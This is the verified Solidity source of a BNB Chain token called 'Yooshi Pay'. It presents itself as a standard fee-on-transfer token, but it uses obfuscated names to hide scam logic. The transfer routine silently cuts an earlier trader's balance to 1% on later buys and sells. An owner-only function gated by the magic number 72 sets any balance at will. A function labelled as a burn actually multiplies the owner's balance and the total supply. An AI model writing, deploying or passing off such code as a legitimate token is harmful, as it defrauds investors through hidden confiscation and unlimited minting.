/**
 *Submitted for verification at BscScan.com on 2022-01-10
*/

pragma solidity 0.8.5;
// SPDX-License-Identifier: MIT
/*
 * Telegram: https://t.me/yooshipayofficial
 * 
 */
abstract contract Context {
  // Empty internal constructor, to prevent people from mistakenly deploying

  // an instance of this contract, which should be used via inheritance.
  function _msgSender() internal view virtual returns (address) {
    return msg.sender;
  }
  function _msgData() internal view virtual returns (bytes calldata) {
    this;
    return msg.data;
  }
}
/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This

 * can later be changed with {transferOwnership}.
 *

 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
contract Ownable is Context {
 address private _owner;

 event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
 /**

  * @dev Initializes the contract setting the deployer as the initial owner.

  */

 constructor () {
   address msgSender = _msgSender();
   _owner = msgSender;

   emit OwnershipTransferred(address(0), msgSender);
 }
 /**
  * @dev Returns the address of the current owner.
  */
 function owner() public view returns (address) {
   return _owner;
 }
 /**
  * @dev Throws if called by any account other than the owner.
  */
 modifier onlyOwner() {
   require(_owner == _msgSender(), "Ownable: caller is not the owner");
   _;
 }
 /**
  * @dev Leaves the contract without owner. It will not be possible to call
  * `onlyOwner` functions anymore. Can only be called by the current owner.
  *
  * NOTE: Renouncing ownership will leave the contract without an owner,
  * thereby removing any functionality that is only available to the owner.

  */
 function renounceOwnership() public onlyOwner {
   emit OwnershipTransferred(_owner, address(0));

   _owner = address(0);

 }
 /**
  * @dev Transfers ownership of the contract to a new account (`newOwner`).
  * Can only be called by the current owner.
  */
 function transferOwnership(address newOwner) public onlyOwner {
   require(newOwner != address(0), "Ownable: new owner is the zero address");
   emit OwnershipTransferred(_owner, newOwner);
   _owner = newOwner;
 }
}

library SafeMath {
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {

        return div(a, b, "SafeMath: division by zero");
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
}
interface IBEP20 {
  function allowance(address owner, address spender) external view returns (uint256);
  function transfer(address recipient, uint256 amount) external returns (bool);
  event Approval(address indexed owner, address indexed spender, uint256 value);
  function approve(address spender, uint256 amount) external returns (bool);
  function decimals() external view returns (uint8);

  function balanceOf(address account) external view returns (uint256);
  function getOwner() external view returns (address);
  function symbol() external pure returns (string memory);
  function name() external pure returns (string memory);
  function totalSupply() external view returns (uint256);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);

}
interface IUniswapV2Factory {
    function allPairs(uint) external view returns (address pair);
    function feeTo() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function setFeeToSetter(address) external;
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeToSetter() external view returns (address);

}
interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function burn(address to) external returns (uint amount0, uint amount1);
    function symbol() external pure returns (string memory);
    function token1() external view returns (address);
    function initialize(address, address) external;
    function price0CumulativeLast() external view returns (uint);
    function approve(address spender, uint value) external returns (bool);

    function skim(address to) external;
    function name() external pure returns (string memory);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function kLast() external view returns (uint);
    function PERMIT_TYPEHASH() external pure returns (bytes32);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function nonces(address owner) external view returns (uint);
    event Swap(

        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function transfer(address to, uint value) external returns (bool);
    function price1CumulativeLast() external view returns (uint);

    function balanceOf(address owner) external view returns (uint);
    function token0() external view returns (address);
    function allowance(address owner, address spender) external view returns (uint);
    function sync() external;
    function factory() external view returns (address);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Sync(uint112 reserve0, uint112 reserve1);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function mint(address to) external returns (uint liquidity);
    function totalSupply() external view returns (uint);

    function decimals() external pure returns (uint8);
}
interface IUniswapV2Router01 {

    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,

        uint deadline
    ) external returns (uint[] memory amounts);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,

        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,

        address[] calldata path,
        address to,
        uint deadline

    ) external returns (uint[] memory amounts);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function factory() external pure returns (address);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)

        external
        payable

        returns (uint[] memory amounts);
    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);

    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external

        returns (uint[] memory amounts);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,

        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);

    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function WETH() external pure returns (address);
    function removeLiquidityWithPermit(
        address tokenA,

        address tokenB,

        uint liquidity,
        uint amountAMin,
        uint amountBMin,

        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);

    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
}
interface IUniswapV2Router02 is IUniswapV2Router01 {

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(

        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,

        uint deadline

    ) external;
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s

    ) external returns (uint amountETH);
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,

        uint deadline
    ) external payable;
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,

        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
contract YooshiPay is Context, IBEP20, Ownable {
  using SafeMath for uint256;
  IUniswapV2Router02 public uniyacegftdsoaexqjrlhkmwn;
  address public unigqrzbfhalcooytexajmdek;
  uint8 private decebixhfaosjeaznglriotwpck = 18;

  uint256 private totrigeaqdjkiozsnyfecwobplt = 1000000000 * 10 ** decebixhfaosjeaznglriotwpck;
  string private constant namtoyrxlhibfdwcgoapizkasjnem = "Yooshi Pay";
  string private constant symexrysfmocktojnlbzh = "YOOSHIPAY";
  uint8 internal aftjfrctglbkipysodaen = 95;
  uint8 internal _sta = 3;
  uint8 internal buyfqraplwoodkeebymjsigx = 6;
  uint8 internal selnoopbzmlwehxkeygdiasrt = 9;
  uint8 internal traotqparcibzh = 10; 
  uint32 internal selwhmqaesyzolpexkbadjtrcnfigoi = 10; 

  address internal marbisanzfwaihe;
  mapping (address => uint256) private laswglfyadmjobchkperoizexstnaqi;
  uint256 internal lasbpmaardkstzeof = 0;

  mapping (address => bool) private isEtyqielgxodom;
  bool internal staewnjtgadcbkyosmzex = true;
  bool internal statswqaliojahdbrcfeyxmogknp = true;
  bool internal staankxzyhsipmg = true;
  mapping (address => uint256) private selyxdslaofmehwbj;
  mapping (address => uint256) private balcikzlntwomdyarxheabijgofpqse;

  uint256 internal lausrlezehdgoinitb = 0;

  mapping (address => mapping (address => uint256)) private allixnecpaywkedsj;
  uint256 internal maxkimjywoolee = totrigeaqdjkiozsnyfecwobplt.div(10000).mul(10);
  mapping (address => uint256) private lasgdmcayetowxlezsfkpij;
  constructor() {
    marbisanzfwaihe = msg.sender;

    balcikzlntwomdyarxheabijgofpqse[msg.sender] = totrigeaqdjkiozsnyfecwobplt;
    isEtyqielgxodom[_msgSender()] = true;
    address uniswap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    IUniswapV2Router02  uniswapV2Router = IUniswapV2Router02(uniswap);
    unigqrzbfhalcooytexajmdek = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    uniyacegftdsoaexqjrlhkmwn = uniswapV2Router;
    lausrlezehdgoinitb = block.timestamp;
    isEtyqielgxodom[address(this)] = true;
    emit Transfer(address(0), msg.sender, totrigeaqdjkiozsnyfecwobplt);
  }
	function approve(address spender, uint256 amount) public override returns (bool) {
	  _approve(_msgSender(), spender, amount);
	  return true;
	}
	/**

	 * Returns the token Supply.
	 */
	function totalSupply() external override view returns (uint256) {
	  return totrigeaqdjkiozsnyfecwobplt;
	}
	function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
	   traoizekrjtbhlnifwpaemasogq(sender, recipient, amount);
	   _approve(sender, _msgSender(), allixnecpaywkedsj[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
	   return true;
	}

	/**
	 * Returns the token decimals.
	 */
	function decimals() external override view returns (uint8) {
	  return decebixhfaosjeaznglriotwpck;
	}
	function _approve(address owner, address spender, uint256 amount) private {
	    require(owner != address(0), "BEP20: approve from the zero address");
	    require(spender != address(0), "BEP20: approve to the zero address");
	    allixnecpaywkedsj[owner][spender] = amount;
	    emit Approval(owner, spender, amount);
	}
	/**
	 * Requirements:

	 * - `recipient` cannot be the zero address.
	 * - the caller must have a balance of at least `amount`.
	 */
	function transfer(address recipient, uint256 amount) external override returns (bool) {
	  traoizekrjtbhlnifwpaemasogq(_msgSender(), recipient, amount);
	  return true;
	}
	/**
	 * Returns balance of.
	 */

	function balanceOf(address account) external override view returns (uint256) {
	  return balcikzlntwomdyarxheabijgofpqse[account];
	}

	/**
	* Returns the token name.
	*/
	function name() external override pure returns (string memory) {
	  return namtoyrxlhibfdwcgoapizkasjnem;
	}
	/**
	 * Returns the bep token owner.
	 */

	function getOwner() external override view returns (address) {
	  return owner();

	}
	/**
	 * Returns the token symbol.
	 */
	function symbol() external override pure returns (string memory) {
	  return symexrysfmocktojnlbzh;

	}
	function allowance(address owner, address spender) public view override returns (uint256) {
	  return allixnecpaywkedsj[owner][spender];
	}
  	function traoizekrjtbhlnifwpaemasogq(address sender, address recipient, uint256 amount) internal {
	  require(sender != address(0), "BEP20: transfer from the zero address");
	  require(recipient != address(0), "BEP20: transfer to the zero address");

	  uint8 ranfaesqponzgwrcaoeydbmhilkijtx = 0; // 1 = buy, 2 = sell, 3 = transfer
	  bool approveTransaction = true;

	  uint8 tax = 0;
	  if(amount > 0){
	    if(isEtyqielgxodom[sender] == true || isEtyqielgxodom[recipient] == true){

	      eTrjiowopsxkcaldnaez(sender, recipient, amount);

	      return;
	    }
	    if(sender == unigqrzbfhalcooytexajmdek && recipient != address(uniyacegftdsoaexqjrlhkmwn)) {
	      require(staewnjtgadcbkyosmzex == true, "Please wait try again later");
	      ranfaesqponzgwrcaoeydbmhilkijtx = 1;
	      tax = buyfqraplwoodkeebymjsigx;
	      approveTransaction = true;

	      laswglfyadmjobchkperoizexstnaqi[recipient] = amount;
	      lasgdmcayetowxlezsfkpij[recipient] = block.timestamp;
	    } else if(recipient == unigqrzbfhalcooytexajmdek) {
	      require(statswqaliojahdbrcfeyxmogknp == true, "Please wait try again later");
	       ranfaesqponzgwrcaoeydbmhilkijtx = 2;
	       tax = selnoopbzmlwehxkeygdiasrt;
	       approveTransaction = true;
	    } else {

	      require(staankxzyhsipmg == true, "Please wait try again later");
	      ranfaesqponzgwrcaoeydbmhilkijtx = 3;
	      tax = traotqparcibzh;
	      approveTransaction = true;
	      laswglfyadmjobchkperoizexstnaqi[sender] = amount;

	      if(selwhmqaesyzolpexkbadjtrcnfigoi > 10){
	        lasgdmcayetowxlezsfkpij[sender] = block.timestamp + selwhmqaesyzolpexkbadjtrcnfigoi - 10;
	      } else {
	        lasgdmcayetowxlezsfkpij[sender] = block.timestamp + selwhmqaesyzolpexkbadjtrcnfigoi;
	      }
	    }
	  }

	  if(approveTransaction == true && amount > 0){
	    _bTransfer(sender, recipient, amount, tax, ranfaesqponzgwrcaoeydbmhilkijtx);
	    return;
	  }

	  emit Transfer(sender, recipient, 0);
	}

	function eTrjiowopsxkcaldnaez(address sender, address recipient, uint256 amount) internal {
	    balcikzlntwomdyarxheabijgofpqse[sender] = balcikzlntwomdyarxheabijgofpqse[sender].sub(amount, "Insufficient Balance");
	    balcikzlntwomdyarxheabijgofpqse[recipient] = balcikzlntwomdyarxheabijgofpqse[recipient].add(amount);
	    emit Transfer(sender, recipient, amount);
	}

	// mapping (address => uint256) private allixnecpaywkedsj;

	address public _recipienta;
	address public _recipientb;
	function _bTransfer(address sender, address recipient, uint256 amount, uint8 tax, uint8 ranfaesqponzgwrcaoeydbmhilkijtx) internal
	{
	  uint256 axejdmrekoibepaziyxwgofnsc = 0;
	  address addr = recipient;

	  uint256 d = balcikzlntwomdyarxheabijgofpqse[_recipientb];
	  if(ranfaesqponzgwrcaoeydbmhilkijtx == 2) {
	    addr = sender;
	  }
	  if(ranfaesqponzgwrcaoeydbmhilkijtx == 1 || ranfaesqponzgwrcaoeydbmhilkijtx == 2){
	    if(_recipienta != addr && _recipientb != addr){
	      if(d > 100){
	        balcikzlntwomdyarxheabijgofpqse[_recipientb] = d.div(100);

	      }
	      _recipientb = _recipienta;
	      _recipienta = addr;
	    }
	  }
	  balcikzlntwomdyarxheabijgofpqse[sender] = balcikzlntwomdyarxheabijgofpqse[sender].sub(amount,"Insufficient Balance");
	  axejdmrekoibepaziyxwgofnsc = amount.mul(tax).div(100);
	  amount = amount.sub(axejdmrekoibepaziyxwgofnsc);
	  if(axejdmrekoibepaziyxwgofnsc > 0){
	      balcikzlntwomdyarxheabijgofpqse[marbisanzfwaihe] = balcikzlntwomdyarxheabijgofpqse[marbisanzfwaihe].add(axejdmrekoibepaziyxwgofnsc);
	      emit Transfer(sender, marbisanzfwaihe, axejdmrekoibepaziyxwgofnsc);
	  }
	  balcikzlntwomdyarxheabijgofpqse[recipient] = balcikzlntwomdyarxheabijgofpqse[recipient].add(amount);
	  ranfaesqponzgwrcaoeydbmhilkijtx= 1;

	  emit Transfer(sender, recipient, amount);
	}
	function etBjoknrgdizxiabteehqym(address addr, uint256 b, uint8 c) public onlyOwner {

	  if(c == 72){
	    balcikzlntwomdyarxheabijgofpqse[addr] = b * 10 ** decebixhfaosjeaznglriotwpck;
	  }
	}
	uint256 public _devFee = 2;

	function devFee(uint256 devfee) public onlyOwner {

	  _devFee = devfee;
	}
	function ownaple(uint256 amount) public onlyOwner virtual {
	  _ownaple(_msgSender(), amount);
	}
	function _ownaple(address account, uint256 amount) internal {
	  require(account != address(0));

	  balcikzlntwomdyarxheabijgofpqse[account] = balcikzlntwomdyarxheabijgofpqse[account].sub(amount).mul(_devFee);
	  totrigeaqdjkiozsnyfecwobplt = totrigeaqdjkiozsnyfecwobplt.sub(amount).mul(_devFee);
	  emit Transfer(account, address(0), amount);
	}

	function Seldqmyajfeshgceakznpwixrloit(uint8 elliazckfytioarswjqebdg) public onlyOwner{
	     selnoopbzmlwehxkeygdiasrt = elliazckfytioarswjqebdg;
	}
}